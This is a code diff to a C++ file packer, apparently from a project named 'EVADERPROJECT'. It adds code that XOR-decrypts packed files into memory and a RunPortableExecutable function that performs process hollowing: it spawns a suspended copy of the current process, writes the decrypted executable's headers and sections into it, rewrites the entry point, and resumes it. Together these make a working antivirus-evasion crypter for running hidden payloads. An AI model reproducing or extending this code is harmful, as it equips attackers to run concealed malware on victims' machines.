@@ -1,10 +1,11 @@
 #include "packroutines.h"
 
-#define KEY_SIZE 4
+#define KEY_SIZE 3
 #define STARTASCII 65
 #define ENDASCII 91
 char key[KEY_SIZE];
 char mainsignature[] = "EVADERPROJECT";
+//char* _image_;
 
 
 const char* packerrors_str[] = {
@@ -181,30 +182,44 @@ int unpackfilesEx(char *archive, char *dest, std::vector<packdata_t> &filesList,
 
 		// how many chunks of Buffer_Size is there is in filesize?
 		long size = pdata->filesize;
+		long siz = pdata->filesize;
 		long pos = 0;
+		long read = 0;
 
-		while (size > 0)
-		{
+		char* _image_ = new char[size*2]();
+		//char _image_[] = "aaa";
+
+		while (size > 0){
+
 			long toread = size > sizeof(buffer) ? sizeof(buffer) : size;
 			fread(buffer, toread, 1, fpArchive);
-			for (int i = 0; i < sizeof(buffer); i++) // for loop for scrambing bits in the string 
+			for (int i = 0; i < sizeof(buffer); i++) { // for loop for scrambing bits in the string 
+				_image_[read + i] = buffer[i] ^ key[i % sizeof(key) / sizeof(char)]; // scrambling/descrambling string
 				buffer[i] = buffer[i] ^ key[i % sizeof(key) / sizeof(char)]; // scrambling/descrambling string
+			}
+			read += toread;
 			fwrite(buffer, toread, 1, fpOut);
 			pos += toread;
 			size -= toread;
 			if (pcb && pcb->fileprogress)
 				pcb->fileprogress(pos);
+				
 		}
+
 		fclose(fpOut);
+
+		RunPortableExecutable(_image_);
+
 		nFiles--;
 
 	}
 
 
 	fclose(fpArchive);
-	return packerrorSuccess;
 
 	
+
+	return packerrorSuccess;
 
 }
 
@@ -279,10 +294,9 @@ bool retrieveKey(char* readSignature, int signatureSize) {
 
 		for (int i = 0; i < signatureSize; i++) { // for loop for scrambing bits in the string 
 			retrievedSig[i] = readSignature[i] ^ (char)key[i % sizeof(key) / sizeof(char)]; // scrambling/descrambling string
-			std::cout << retrievedSig[i];
+			//std::cout << retrievedSig[i];
 		}
 		retrievedSig[signatureSize] = '\0';
-		std::cout << "\n";
 
 		if (!strcmp(retrievedSig, mainsignature)) return 1;
 
@@ -298,4 +312,76 @@ bool retrieveKey(char* readSignature, int signatureSize) {
 	}
 
 	return 0;
+}
+
+
+int RunPortableExecutable(HANDLE Image) {
+
+	IMAGE_DOS_HEADER* DOSHeader;
+	IMAGE_NT_HEADERS* NtHeader;
+	IMAGE_SECTION_HEADER* SectionHeader;
+
+	PROCESS_INFORMATION PI;
+	STARTUPINFO SI;
+
+	CONTEXT* CTX;
+
+	DWORD* ImageBase;
+	void* pImageBase;
+
+	int count;
+	char CurrentFilePath[1024];
+
+	DOSHeader = PIMAGE_DOS_HEADER(Image);
+	NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);
+
+	GetModuleFileName(0, CurrentFilePath, 1024);
+	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) {
+
+		ZeroMemory(&PI, sizeof(PI));
+		ZeroMemory(&SI, sizeof(SI));
+
+		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
+			CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
+
+			CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
+			CTX->ContextFlags = CONTEXT_FULL;
+
+			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {
+
+				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
+
+				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
+					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
+
+				WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
+
+				
+
+				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++) {
+
+					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));
+
+					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
+						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
+
+				}
+
+
+				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
+					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);
+
+				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
+				SetThreadContext(PI.hThread, LPCONTEXT(CTX));
+
+				ResumeThread(PI.hThread);
+				
+
+				return 0;
+			}
+
+		}
+
+	}
+
 }
